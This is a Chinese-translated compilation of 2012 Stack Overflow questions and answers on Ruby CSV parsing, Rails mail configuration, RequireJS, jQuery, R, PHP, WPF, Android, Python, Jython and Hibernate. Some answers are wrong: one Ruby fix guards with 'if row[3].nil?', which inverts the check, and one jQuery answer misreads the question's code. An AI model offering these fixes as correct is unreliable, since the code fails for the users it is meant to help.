> 时间：2012-11-16T14:55:18.783

您已经很接近了，不用担心这在 DXL 帮助中也不容易找到。

```
Link lnk
for lnk in all (current Object) -> "*" do 
{
    print "Link found"
} 
```

我添加的唯一词是`all`。这允许它找到版本化的链接。您可以在 DXL 帮助中搜索版本化链接，您应该会找到它。

# ruby-on-rails - 用于 nil:NilClass 的未定义方法“gsub”和用于 nil:NilClass RoR 2.3.8 的未定义方法“strptime”出现奇怪错误

> ID：13418120
> 
> 赞同：0
> 
> 时间：2012-11-16T14:01:48.030
> 
> 标签：ruby-on-rails, csv, null

您好我正在尝试读取 csv 文件，我的代码是这样的：

```
CSV.foreach(path, {:col_sep => @seperator}) do |row|
    #CSV.foreach(File.basename(path), {:col_sep => @seperator}) do |row|
        r = Route.new
        r.contact_id = contact_id
        r.name = row[0]
        r.number_range = row[1]
        r.rate = row[3].gsub(",", ".").to_f
        r.valid_from = DateTime.strptime(row[5], @time_format) 
        r.currency = @currency
        r.save
    end 
```

我在这行有问题：

```
 r.rate = row[3].gsub(",", ".").to_f
        r.valid_from = DateTime.strptime(row[5], @time_format) 
```

我得到错误：`undefined method 'gsub' for nil:NilClass`和

```
undefined method `strptime' for nil:NilClass 
```

但我完全确定 row[3] 和 row[5] 不是零，知道为什么会这样吗？提前致谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-16T14:08:26.273

.gsub() 是一个 String 方法，因此它仅在 row[3] 值为字符串时才有效。您的某些行似乎为零。为避免这种情况，您可以为 nil 值添加一个简单的检查器

```
r.rate = row[3].gsub(",",".").to_f if row[3].nil? 
```

下一行再次出现相同的错误。因此您可以将其更改为：

```
r.valid_from = DateTime.strptime(row[5], @time_format) if row[5].nil? 
```

您说您确定这些值不为零，但这正是错误所说的。只需要 1 行 nil 值就可以破坏整个脚本。

您还在对第 3 行和第 5 行进行硬编码。也许您的意思是不同的行？尝试测试以确保该行与您认为它在 IRB 中的完全相同。你能告诉我们什么 row[3] 和 row[5] 相等吗？

# ruby-on-rails - 瘦服务器不使用 Capistrano 加载环境变量

> ID：13418123
> 
> 赞同：2
> 
> 时间：2012-11-16T14:01:58.247
> 
> 标签：ruby-on-rails, deployment, environment-variables, capistrano, thin

我正在使用 capistrano 部署我的 rails 应用程序并使用瘦服务器。我在 ~/.bash_profile 中定义了 2 个用于我的邮件用户名和密码的环境变量`export SMTP_USERNAME=...`。

当我 ssh 到服务器并尝试从 rails 控制台发送电子邮件时，它工作正常，但看起来它们在我运行`cap deploy`或任何其他命令时没有被瘦加载。

定义它们的正确方法是什么？我看过一些帖子，他们建议直接在`config/environments/production.rb`与代码本身相关的文件或其他文件中定义它们。出于安全原因，我试图避免这种情况。

**更新**：我尝试使用 yml 文件来存储它，但我遇到了这个问题：

我`email_config.rb`在`config/initializers`. 它的内容是：

```
EMAIL_CONFIG = YAML.load_file("#{RAILS_ROOT}/config/email.yml")[RAILS_ENV] 
```

在`config/email.yml`我有：

```
production:
    username: username
    password: password 
```

在我的`config/environments/production.rb`我有：

```
config.action_mailer.delivery_method = :smtp
config.action_mailer.perform_deliveries = true
config.action_mailer.raise_delivery_errors = true
config.action_mailer.default :charset => "utf-8"
config.action_mailer.smtp_settings = {
  address: "smtp.gmail.com",
  port: 587,
  authentication: :plain,
  enable_starttls_auto: true,
  user_name: EMAIL_CONFIG[:username],
  password: EMAIL_CONFIG[:password]
} 
```

现在的问题是初始化程序是在之后加载的`environments.rb`，如果我将变量的定义放在`EMAIL_CONFIG`我的电子邮件配置之前，那么`RAILS_ROOT`变量就没有定义。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-16T14:45:31.880

就像您说的那样，将密码直接保存在 production.rb 中并不是一个好主意。更好的选择是从 shell 变量（更接近您当前的设置）或 yaml 文件（我个人所做的）中引用它们。[您可以在这篇文章](https://stackoverflow.com/questions/6245284/where-to-put-secure-passwords-keys-in-a-rails-app)中找到更多信息

# requirejs - 要求 JQuery 的 JS 优化错误

> ID：13418125
> 
> 赞同：4
> 
> 时间：2012-11-16T14:02:13.293
> 
> 标签：requirejs

我正在尝试使用 requireJS 的 r.js 来缩小我的代码。

我的**命令**是

```
$node node_modules\requirejs\bin\r.js name=main out=main-built.js baseUrl=. 
```

我收到以下错误。

```
timers.js:103
            if (!process.listeners('uncaughtException').length) throw e;
                                                                      ^
Error: Evaluating ./lib/jquery-1.8.0.min.js as module "jquery" failed with error
: ReferenceError: window is not defined
    at Function.req.load (C:\xampp\htdocs\ember\App\js\node_modules\requirejs\bin
\r.js:2227:23)
    at Object.context.load (C:\xampp\htdocs\ember\App\js\node_modules\requirejs\b
in\r.js:1681:21)
    at Object.Module.load (C:\xampp\htdocs\ember\App\js\node_modules\requirejs\bi
n\r.js:907:29)
    at Object.Module.fetch (C:\xampp\htdocs\ember\App\js\node_modules\requirejs\b
in\r.js:897:66)
    at Object.Module.check (C:\xampp\htdocs\ember\App\js\node_modules\requirejs\b
in\r.js:927:26)
    at Object.Module.enable (C:\xampp\htdocs\ember\App\js\node_modules\requirejs\
bin\r.js:1211:22)
    at Object.context.enable (C:\xampp\htdocs\ember\App\js\node_modules\requirejs
\bin\r.js:1553:39)
    at Object.Module.enable.mod (C:\xampp\htdocs\ember\App\js\node_modules\requir
ejs\bin\r.js:1196:33)
    at g (C:\xampp\htdocs\ember\App\js\node_modules\requirejs\bin\r.js:233:23)
    at each (C:\xampp\htdocs\ember\App\js\node_modules\requirejs\bin\r.js:165:31) 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-01-08T10:03:41.450

这里有一些关于使用 jQuery 和 RequireJS 的文档：

[http://requirejs.org/docs/jquery.html](http://requirejs.org/docs/jquery.html)

确保您的配置看起来像这样：

```
require.config({

paths: {
    jquery: 'lib/jquery',
    // other paths
},
shim: {
    jquery: ['jquery'],
    // plugins that depend on jquery
    slider: {
        deps: ['jquery']
    },
    moment: {
        deps: ['jquery']
    }
}
}); 
```

# javascript - 使用 Google Analytics 跟踪 Javascript 小部件

> ID：13418131
> 
> 赞同：9
> 
> 时间：2012-11-16T14:02:39.867
> 
> 标签：javascript, google-analytics

我正在尝试找出跟踪 Javascript 小部件的最佳方法。我为一家非营利组织工作，我编写了一个 Javascript 小部件，网站可以嵌入到他们的网站上。他们放在网站上的那段代码有一个小部件容器（一个 div），它会加载我们的 .js 文件。我们的 .js 文件使用 HTML 填充容器以显示图像和一些信息。

我希望能够跟踪此小部件在其他网站上的使用情况以及它被加载（看到）的次数。我们在我们的网站上使用谷歌分析，所以这似乎是最有效的方法。我不想在小部件中嵌入*我们的*GA 代码，因为这很可能会破坏其他站点可能正在执行的任何 GA 跟踪。

我的想法是包含一个隐藏的 iframe，它可以在我们的网站上加载跟踪页面，并且跟踪页面中将包含正确的 GA 代码。因此，例如：usersite.com 将我们的小部件嵌入到他们的页面上。.js 文件由 mycompany.org/js/widget.js 提供，widget.js 在 usersite.com（在我们的 div 中）上创建一个隐藏的 iframe，加载 mycompany.org/js/trackingpage.html（也许它包括一个一些参数，如 domain=usersite.com 或跟踪页面上的 js 可以拉出并登录到 GA 的参数）和 trackingpage.html 有我们的 GA 代码来注册小部件已被使用。

这似乎是解决此问题的一种简单方法。这似乎是一种合理的方法吗？或者，还有更好的方法？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2013-08-13T14:28:29.317

我们的小部件由客户使用，包括他网站中的 javascript 文件。我们的 javascript 代码将小部件添加到页面中所需的位置。

添加 Google Analytics 非常简单：我将 GA 代码添加到客户站点加载的 javascript 文件中：

```
// setup google analytics
var _gaq = _gaq || [];
_gaq.push(['REPLACE_WITH_SOME_UNIQUE_NAMESPACE._setAccount', 'REPLACE_WITH_YOUE_GA_ID']);
_gaq.push(['REPLACE_WITH_SOME_UNIQUE_NAMESPACE._trackPageview']);

(function() {
  var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
  ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
  var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
})(); 
```

我还直接从我们的 Javascript 中跟踪其他特定事件，如下所示：

```
 _gaq.push(['REPLACE_WITH_SOME_UNIQUE_NAMESPACE._trackEvent', 'REPLACE_WITH_YOUR_EVENT_CATEGORY', 'REPLACE_WITH_YOUR_EVENT_ACTION']); 
```

**重要的**

您**必须**使用命名空间以避免与站点的 GA（如果存在）发生冲突

您应该将您的 Google Analytics 配置文件配置为也显示主机。[谷歌在这里](https://developers.google.com/analytics/devguides/collection/gajs/gaTrackingSite#profilesKey)有一个很好的解释（在使用过滤器修改您的跨域配置文件以在您的内容报告中显示完整域）

到目前为止，只要您确保 cookie 配置（域等）与托管站点的相似，这种方法似乎就可以正常工作。例如，如果主机域不同，则可能会导致重复命中。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-07-23T13:57:23.650

在带有小部件的客户端站点上，有一个 ajax 请求调用您的服务器以请求小部件内容。使用 GA Campaign 参数信息标记请求 URL，您将能够看到小部件流量。可以调整 ajax 响应以适应场景。

# r - ggplot2 stat_sum：用百分比标记点

> ID：13418133
> 
> 赞同：3
> 
> 时间：2012-11-16T14:02:47.577
> 
> 标签：r, ggplot2, labels

我想问一下是否可以用该点所代表的观察值的百分比（即比例）来标记 stat_sum 绘制的每个点。理想情况下，我希望标签采用百分比格式而不是十进制格式。

非常感谢您的时间。

**编辑：最小的可重现示例**

```
library("ggplot2")
library("scales")

ggplot(diamonds, aes(x = cut, y = clarity)) +
  stat_sum(aes(group = 1)) +
  scale_size_continuous(labels=percent) 
```

[结果图的图像](http://i.stack.imgur.com/yhofJ.png)

所以我的问题是，如何（如果可能）用它们的“prop”百分比值标记每个汇总点。

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-11-18T00:54:13.257

有几个选项。我假设不需要图例，因为这些点标有百分比计数。

一种选择是添加另一个`stat_sum()`包含标签美学和“文本”几何图形的函数。例如：

```
library("ggplot2")

ggplot(diamonds, aes(x = cut, y = clarity, group = 1)) +
  stat_sum(geom = "point", show.legend = FALSE) +
  stat_sum(aes(label = paste(round(..prop.. * 100, 2), "%", sep = "")), 
              size = 3, hjust = -0.4, geom = "text", show.legend = FALSE) 
```

或者，可能不需要积分。标签可以完成所有工作 - 显示位置和大小：

```
ggplot(diamonds, aes(x = cut, y = clarity, group = 1)) +
   stat_sum(aes(label = paste(round(..prop.. * 100, 2), "%", sep = "")), 
              geom = "text", show.legend = FALSE) +
  scale_size(range=c(2, 8)) 
```

有时在 ggplot 之外创建汇总表更容易：

```
library(plyr)
df = transform(ddply(diamonds, .(cut, clarity), "nrow"),
        percent = round(nrow/sum(nrow)*100, 2))

ggplot(df, aes(x = cut, y = clarity)) +
  geom_text(aes(size = percent, label = paste(percent, "%", sep = "")), 
                     show.legend = FALSE) +
  scale_size(range = c(2, 8)) 
```

![在此处输入图像描述](../Images/ed24293df3e92ee48f25c25266f09186.png)

# javascript - 如何在jquery中检查父级

> ID：13418135
> 
> 赞同：0
> 
> 时间：2012-11-16T14:02:46.543
> 
> 标签：javascript, jquery

我在`document`. 我有一个 id 的 div `parent`。现在，每当点击事件发生时，`document`我都会尝试检查目标元素是否为子元素`div ( id = parent )`。

```
 <div id="parent">
    <div id="c1">
     <div id="gc1">
     </div>
     <div id="gc2">
     </div>
     ...
    </div>
    ...
   </div> 
```

为此，我编写了以下 jquery 代码：

```
$(document).click( function(e) {
     if($(e.target).parents("#parent").length > 0)  //this condition is not 
                                                      working as expected
     { }
}); 
```

我在这里做错了什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-16T14:04:22.640

如果您发布的代码是逐字记录的，那么您忘记将其声明`e`为回调函数的参数。

除此之外，您的代码看起来应该可以正常工作。但是，为了提高效率，您可以使用`.closest()`而不是`.parents()`因为它只会返回 0 或 1 个元素，而不是整个元素链。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-16T14:08:44.110

你可以使用[jQuery.contains()](http://api.jquery.com/jQuery.contains/)

```
if( $.contains( document.getElementById('parent'), e.target) ) {

} 
```

这将检查目标是否*包含*在*父*容器中。

从文档：

> 注意：第一个参数必须是 DOM 元素，而不是 jQuery 对象或纯 JavaScript 对象。

*这就是 getElementById 的原因。*

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-16T14:05:39.480

编辑使用最近的...工作[**FIDDLE**](http://jsfiddle.net/videsignz/T8cPk/)

首先...这可能无法完全回答您的问题，但您需要点击功能中的 (e)。

```
$(document).click( function(e) {
 if($(e.target).closest("#parent").length > 0) 
 { }
}); 
```

# php - 将变量从一个函数发送到另一个 php 函数

> ID：13418139
> 
> 赞同：0
> 
> 时间：2012-11-16T14:02:56.170
> 
> 标签：php

我正在尝试将变量从公共函数发送到私有静态函数，如下所示：

```
public function getAirportFare($fare) {

    $fare2 = 1000;

    return self::getFinalFare($fare, $fare2);

} 
```

至：

```
private static function getFinalFare($fare, $fare2) {

    $fare = $fare + $fare2;

    $final_fare = ($fare * self::$fare_factor);

    if (self::$str_wait_return == "true") {
        $final_fare = $final_fare * 2;
    }

    if (self::$str_return == "true" && self::$return_date != "false" && self::$return_time != "false") {

        // We need to calc to fare based on the return date and time
        $return_fare = self::getFare(1);

        // Append to final fare
        $final_fare = $final_fare + $return_fare;

    }

    return number_format($final_fare,2);

} 
```

但是 getFinalFare 函数中的 $fare2 是未定义的？我只是想知道如何传递这个值？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-16T14:17:51.197

我将假设这两种方法在同一个类中，如果不是，请告诉我，我会更新我的答案。

你要做的事情如下。

```
public function getAirportFare($fare) {

$fare2 = 1000;

return static::getFinalFare($fare, $fare2); 
```

}

这将使用类中的静态方法，无论该类是否被重构或重命名。

# r - 为 R 数据框中的记录块创建序列号

> ID：13418143
> 
> 赞同：4
> 
> 时间：2012-11-16T14:03:02.583
> 
> 标签：r, data.table, plyr

我有一个相当大的数据集（按照我的标准），我想为记录块创建一个序列号。我可以使用 plyr 包，但是执行时间很慢。下面的代码复制了一个可比较大小的数据框。

```
## simulate an example of the size of a normal data frame
N <- 30000
id <- sample(1:17000, N, replace=T)
term <- as.character(sample(c(9:12), N, replace=T))
date <- sample(seq(as.Date("2012-08-01"), Sys.Date(), by="day"), N, replace=T)
char <- data.frame(matrix(sample(LETTERS, N*50, replace=T), N, 50))
val <- data.frame(matrix(rnorm(N*50), N, 50))
df <- data.frame(id, term, date, char, val, stringsAsFactors=F)
dim(df) 
```

实际上，这比我使用的要小一些，因为这些值通常更大……但这已经足够接近了。

这是我机器上的执行时间：

```
> system.time(test.plyr <- ddply(df, 
+                                .(id, term), 
+                                summarise, 
+                                seqnum = 1:length(id), 
+                                .progress="text"))
  |===============================================================================================| 100%
   user  system elapsed 
  63.52    0.03   63.85 
```

有一个更好的方法吗？不幸的是，我在 Windows 机器上。

提前致谢。

编辑： Data.table 非常快，但我无法正确计算序列号。这是我的 ddply 版本创建的。大多数在组中只有一条记录，但有些有 2 行、3 行等。

```
> with(test.plyr, table(seqnum))
seqnum
    1     2     3     4     5 
24272  4950   681    88     9 
```

并使用如下所示的 data.table ，同样的方法产生：

```
> with(test.dt, table(V1))
V1
    1 
24272 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-16T14:36:54.600

利用`data.table`

```
dt = data.table(df)
test.dt = dt[,.N,"id,term"] 
```

这是一个时间比较。我使用 N = 3000 并在生成数据集时将 17000 替换为 1700

```
f_plyr <- function(){
  test.plyr <- ddply(df, .(id, term), summarise, seqnum = 1:length(id), 
 .progress="text")
}

f_dt <- function(){
 dt = data.table(df)
 test.dt = dt[,.N,"id,term"]
}

library(rbenchmark)
benchmark(f_plyr(), f_dt(), replications = 10,
  columns = c("test", "replications", "elapsed", "relative")) 
```

`data.table`将速度提高 170 倍

```
test replications elapsed relative
2   f_dt()           10   0.779    1.000
1 f_plyr()           10 132.572  170.182 
```

还可以查看 Hadley 在`dplyr`. `dplyr`如果提供额外的加速，我不会感到惊讶，因为很多代码都在 C 中重新编写。

更新：编辑代码，`length(id)`根据`.N`马特的评论更改。

# php - DOMDocument 在 h2 中获取链接

> ID：13418145
> 
> 赞同：0
> 
> 时间：2012-11-16T14:03:05.467
> 
> 标签：php, html, domdocument

我正在使用`php`，并且`DOMDocument`

我需要做的是让所有`href`这些`<a>`都在`<h2>`标签内

在有类似列表的页面上

```
<h2><a href="blablabla">The title</a></h2> 
```

`<a>`每个中只有一个`<h2>`

我设法实现的是：

1.  通过加载文档：loadfromhtml（此项目需要）
2.  `<h2>`在文档中获取
3.  得到那些`<h2>->nodeValue (caption of url)`

所以我的问题是，当我尝试`getElementsByTagName('a')`在`<h2>`节点（#2）上做同样的事情时，php 挂起（不再产生输出，页面加载停止）

我哪里做错了？感谢帮助，谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-16T14:12:36.673

对我来说很好，例如

```
<?php
$doc = new DOMDocument;
$doc->loadhtml(data());

foreach( $doc->getElementsByTagName('h2') as $h2 ) {
    foreach( $h2->getElementsByTagName('a') as $a ) {
        echo $a->getAttribute('href'), ': ', $a->nodeValue, "\n";
    }
}

function data() {
    return <<< eoh
<html>
    <head><title>...</title></head>
    <body>
        <h2><a href="link1">header 1</a></h2>
        <p>yadda yadda</p>
        <h2><a href="link2">header 2</a></h2>
        <p>yadda yadda</p>
        <h2><a href="link3">header 3</a></h2>
        <p>yadda yadda</p>
    </body>
</html>
eoh;
} 
```

但我发现为此使用[XPath](http://www.w3.org/TR/xpath/)更容易，
例如

```
<?php
$doc = new DOMDocument;
$doc->loadhtml(data());
$xpath = new DOMXPath($doc);

foreach( $xpath->query('/html/body//h2/a') as $a) {
    echo $a->getAttribute('href'), ": ", $a->nodeValue, "\n";
}

function data() {
    return <<< eoh
<html>
    <head><title>...</title></head>
    <body>
        <h2><a href="link1">header 1</a></h2>
        <p>yadda yadda</p>
        <h2><a href="link2">header 2</a></h2>
        <p>yadda yadda</p>
        <h2><a href="link3">header 3</a></h2>
        <p>yadda yadda</p>
    </body>
</html>
eoh;
} 
```

印刷

```
link1: header 1
link2: header 2
link3: header 3 
```

# parallel-port - 发生 EPP 连接错误

> ID：13418147
> 
> 赞同：0
> 
> 时间：2012-11-16T14:03:10.620
> 
> 标签：parallel-port

我需要连接到使用 EPP 模式进行通信的并行端口设备。但是，我收到错误“**发生 EPP 连接错误：轮询：系统调用中断**”。当我尝试使用 gdb 进行调试或使用 strace 查找问题时，我没有出现此错误，并且能够连接到设备。出了什么问题？我怎样才能解决这个问题？

[编辑] 我使用 linux。使用的设备是连接到并行端口的触觉设备。设备的打开是通过触觉设备 SDK 提供的初始化例程完成的。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-04T07:59:00.947

现在已修复。

问题出在 BIOS 上。我们不得不将主板寄回并更新了 BIOS，它运行良好。

# r - R中的有效循环逻辑回归

> ID：13418148
> 
> 赞同：3
> 
> 时间：2012-11-16T14:03:14.580
> 
> 标签：r, loops, runtime, regression

我正在尝试对约 400k 预测变量中的每一个进行多重逻辑回归分析。我想将每次运行的输出捕获到输出表的行/列中。

我的数据分为两部分。我有一个 400000 x 189 双矩阵 ( `mydatamatrix`)，其中包含在 189 个人 ( `P1`) 中测量的 400000 个预测变量中的每一个的观察/数据。我还有第二个 189 x 20数据`mydataframe`框（`O1``P2`

我的回归模型是`O1~ P1+P2`，其中`O1`是二元的。

我得到了以下循环工作：

为结果创建输出文件

```
output<-data.frame(matrix(nrow=400000, ncol=4))
names(output)=c("Estimate", " Std. Error", " z value", " Pr(>|z|)") 
```

为预测变量运行逻辑回归循环`i`并将输出存储在输出文件中

```
for (i in c(1:400000)){
  result<-(glm(mydataframe$O1 ~ mydatamatrix[,i] + as.factor(mydataframe$P2),
               family=binomial))
  row.names(output)<-row.names(mydatamatrix)
  output[i,1]<-coef(summary(result))[2,1]
  output[i,2]<-coef(summary(result))[2,2]
  output[i,3]<-coef(summary(result))[2,3]
  output[i,4]<-coef(summary(result))[2,4]
} 
```

但是，运行时间很长（输出前 20k 个测试需要一个多小时）。是否有更有效的方法来运行此分析？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-16T14:12:09.547

`apply`如果您使用而不是`for`循环，它会更快：

```
t(apply(mydatamatrix, 2,
        function(x)
          coef(summary(glm(mydataframe$O1 ~ x + as.factor(mydataframe$P2), 
                           family=binomial)))[2, 1:4])) 
```

# c# - WPF 在代码中绑定 TextBox 和 DataRow

> ID：13418152
> 
> 赞同：2
> 
> 时间：2012-11-16T14:03:27.853
> 
> 标签：c#, wpf, binding, datarow

我想绑定文本框和数据行列，但不起作用。我的代码：

```
// Member is a DataRow
for(int i=0;i<Member.Table.Count;++i)
{
  TextBox textbox = TextBox();
  textbox.Text = Member.Field<string>(i);
  Binding binding = new Binding(Member.Table.Columns[i].ColumnName);
  binding.Source = Member;
  binding.Path = new PropertyPath(Member.Table.Columns[i].ColumnName);
  binding.UpdateSourceTrigger = UpdateSourceTrigger.PropertyChanged;
  binding.Mode = BindingMode.TwoWay;
  textbox.SetBinding(System.Windows.Controls.TextBox.TextProperty, binding);
} 
```

任何想法？认为

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-16T14:35:39.273

您正在`textbox`代码中创建它，但从未在任何地方显示它，因此它可能正在工作，但您永远不会看到结果。

# android - 如何使用 Image 视图运行动画？

> ID：13418155
> 
> 赞同：0
> 
> 时间：2012-11-16T14:03:52.167
> 
> 标签：android, animation

我正在寻找示例代码，我的 xml 很好，我想在活动开始时立即开始动画，而不是按任何东西

```
 import android.app.Activity;
import android.graphics.drawable.AnimationDrawable;
import android.os.Bundle;
import android.widget.ImageView;

public class AnimationActivity extends Activity
{
ImageView genie;
/** Called when the activity is first created. */
@Override
public void onCreate(Bundle savedInstanceState)
{
super.onCreate(savedInstanceState);
setContentView(R.layout.main);
  genie = (ImageView)findViewById(R.id.genieout);
genie.setBackgroundResource(R.drawable.genieani);

genie.post(new Runnable() {
    @Override
    public void run() {
        AnimationDrawable genieout =
            (AnimationDrawable) genie.getBackground();
        genieout.start();
    }
}); 
```

}

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-16T14:08:41.503

```
public void onStart() {
   super.onStart();
   myImageView.startAnimation( myAnimation );
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-16T14:10:20.420

看看 NineOldAndroids。是一个非常好的库，可以将 HoneyComb+ 动画反向移植到 android 1.0。

[http://nineoldandroids.com/](http://nineoldandroids.com/)

很确定你会在这里的库示例源代码中找到你需要的东西

[https://github.com/JakeWharton/NineOldAndroids/tree/master/sample](https://github.com/JakeWharton/NineOldAndroids/tree/master/sample)

# python - 未引发异常 - Python

> ID：13418156
> 
> 赞同：0
> 
> 时间：2012-11-16T14:04:00.623
> 
> 标签：python, exception-handling

```
class client():
    def __init__(self,identitate,nume,cnp,filme_inchiriate,inchirieri):
        self.__identitate=identitate
        self.__nume=nume
        self.__cnp=cnp
        self.__filme_inchiriate=filme_inchiriate
        self.__inchirieri=inchirieri  

    def get_identitate(self):
        return self.__identitate

    def get_nume(self):
        return self.__nume

    def get_cnp(self):
        return self.__cnp

    def get_filme_inchiriate(self):
        return self.__filme_inchiriate

    def get_inchirieri(self):
        return self.__inchirieri

    def set_identitate(self, value):
        self.__identitate = value

    def set_nume(self, value):
        self.__nume = value

    def set_cnp(self, value):
        self.__cnp = value

    def set_filme_inchiriate(self, value):
        self.__filme_inchiriate = value

    def set_inchirieri(self, value):
        self.__inchirieri = value

    def del_identitate(self):
        del self.__identitate

    def del_nume(self):
        del self.__nume

    def del_cnp(self):
        del self.__cnp

    def del_filme_inchiriate(self):
        del self.__filme_inchiriate

    def del_inchirieri(self):
        del self.__inchirieri

    identitate = property(get_identitate, set_identitate, del_identitate, "identitate's docstring")
    nume = property(get_nume, set_nume, del_nume, "nume's docstring")
    cnp = property(get_cnp, set_cnp, del_cnp, "cnp's docstring")
    filme_inchiriate = property(get_filme_inchiriate, set_filme_inchiriate, del_filme_inchiriate, "filme_inchiriate's docstring")
    inchirieri = property(get_inchirieri, set_inchirieri, del_inchirieri, "inchirieri's docstring")
    def __str__(self):
        return "ID: " + str(self.get_identitate()) + " Nume: " + str(self.get_nume()) + " CNP: "+ str(self.get_cnp())

from entities import *

class validator_client():

     def validate_client(self,client):
         erori=[]
         if client.get_identitate=="":
             erori.append("Nu ati introdus ID!")
         if client.get_nume=="":
             erori.append("Nu ati indorus nume!")
         if len(erori)>0:
             raise ValidatorException(erori)

     def haha(self,client):
         if client.get_identitate()=="1":
             print "hahahah" 

class ValidatorException(Exception):
     def __init__(self,erori):
         self.__erori=erori
     def get_erori(self):
         return self.__erori
     def __str__(self):
         return self.erori
     erori = property(get_erori, None, None, None)

client1=client("",2,3,4,5)
validare=validator_client()
try:
     validare.validate_client(client1)
except:
     ValidatorException
     print (ValidatorException) 
```

`client()`是一个有 5 个属性的类，其中第一个是 id，它有一个 getter 和 setter，所以这个类没有问题，但是为什么在我运行它时没有打印任何错误？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-16T14:09:20.990

一些事情：你没有调用那个getter，你正在获取方法（除非它是一个属性，在这种情况下，为什么它被称为get）。此外，正如@Martijn Pieters 在评论中所说，您的 except 子句捕获所有异常，然后打印`ValidatorException`类的字符串表示，而不是异常实例。

就`except`条款而言，我认为您可能正在寻找的是：

```
except ValidatorException as ve:
    print(ve) 
```

# java - 使用 Jython 的 permgen 内存不足

> ID：13418157
> 
> 赞同：0
> 
> 时间：2012-11-16T14:04:06.073
> 
> 标签：java, jython, out-of-memory, permgen

我们的 Jython 环境存在问题，这意味着在 PythonInterpreter 对象上调用一定数量的 eval 之后，我们遇到了“Out of permgen memory”错误。

有没有人有这方面的经验以及如何解决它？

我们目前在 Jython 2.5.2 上运行。

下面是用于重复调用解释器的代码摘录。

```
public Map<String, String> invoke(Map<String, String> parameters) {

    //logger.info("Executing script for parameters: " + parameters);

    this.interpreter.set("inputDict", parameters);
    PyDictionary dict =  (PyDictionary)this.interpreter.eval(ScriptComposer.mainMethodName + "(inputDict)");

    //logger.info("Done executing script for parameters: " + parameters);

    return dict;

} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-19T13:27:46.613

好吧，我想我已经解决了这个问题，所以为了帮助遇到这个问题的其他人，我会发布一些提示。

对于 2.5.2 之前的 Jython 版本，确实存在与类生成和类引用保持有关的错误，这意味着在对 eval/exec 进行一定数量的调用之后，就会遇到上述问题。

但是，当使用 Jython 2.5.2 及更高版本时，本身没有任何问题，但是当在不同线程上同时使用多个 PythonInterpreter 对象时，永久生成对象（类和静态成员）的必要内存会增加，因此您必须开始你的虚拟机：

```
-XX:PermSize=$START_JVM_PERMSIZE -XX:MaxPermSize=$MAX_JVM_PERMSIZE 
```

从而增加为永久代对象分配的起始内存和最大内存。

希望这将帮助其他人更快地解决这个问题。

# oracle - Hibernate + oracle 序列 + 触发器

> ID：13418163
> 
> 赞同：7
> 
> 时间：2012-11-16T14:04:34.263
> 
> 标签：oracle, hibernate, jpa, persistence, sequence

我有一个表，其索引由使用序列的触发器自动填充（Oracle 数据库）

```
CREATE TABLE A
(
  IDS                           NUMBER(10)      NOT NULL
)

CREATE OR REPLACE TRIGGER A_TRG
BEFORE INSERT
ON A REFERENCING NEW AS New OLD AS Old
FOR EACH ROW
BEGIN
  :new.IDS := A_SEQ.nextval;
END A_TRG;
/ 
```

我有一个匹配的 Java 类：

```
Class A {
   @Id
   @SequenceGenerator(name = "aSequence", sequenceName = "A_SEQ", allocationSize = 1)
   @GeneratedValue(generator = "aSequence", strategy = GenerationType.SEQUENCE)
   @Column(name = "IDS")
   Long id;

   ...
} 
```

当我尝试像这样持久化 A 的实例时：

```
EntityTransaction transaction = entityManager.getTransaction();
transaction.begin();
A a = new A();
Long id = getHibernateTemplate().save(a);
transaction.commit(); 
```

我遇到了这个问题：

*   保存调用返回的代码中的 ID = **"X"**

*   数据库中的 ID = **"X+1"**

有没有办法设置 Hibernate 让数据库触发器创建 ID？

谢谢

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2012-11-20T10:23:14.830

在 Oracle Trigger 的 HIbernate 问题中找到[响应，用于从序列生成 id](https://stackoverflow.com/questions/8002119/hibernate-issue-with-oracle-trigger-for-generating-id-from-a-sequence)

我需要调整我的触发器以仅在没有给出 ID 时运行：

```
CREATE OR REPLACE TRIGGER A_TRG
BEFORE INSERT
ON A REFERENCING NEW AS New OLD AS Old
FOR EACH ROW
WHEN (New.IDS is null) -- (1)
BEGIN
  :new.IDS := A_SEQ.nextval;
END A_TRG;
/ 
```

(1) this line allow Hibernate to manually call A_SEQ.nextVal to set the ID and then bypass the trigger else Hibernate will get the nextval for uselessly because the trigger will always reset the ID calling nextval again

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-17T19:52:22.907

在您的 B 类`@GeneratedValue(generator = "preferenceSequence")`中，您拥有的示例中没有定义，它应该是 `@GeneratedValue(generator = "bSequence")`

默认情况下，休眠分配大小为 50 B: IDS=50 似乎表明映射选择了错误的序列。

# github - 项目发布历史文件

> ID：13418167
> 
> 赞同：-1
> 
> 时间：2012-11-16T14:04:49.317
> 
> 标签：github, version, history

我在 GitHub 上托管了一个开源项目。在我该死的项目的每个版本之后，我都想将新功能和错误修复列表写入某个文件，例如**History.md**。它看起来像：

```
=== Version 0.0.1 2012-12-21

Version with a new awesome bugs has been released

* [added] New feature
* [fixed] Some bug fixed 
```

但我犹豫了。可能是我错了吗？我不知道，所以我问。是否有任何指导方针/规则/建议/良好的经验/关于如何格式化历史更改的任何其他内容？或者也许更改列表不应该是一个文件？

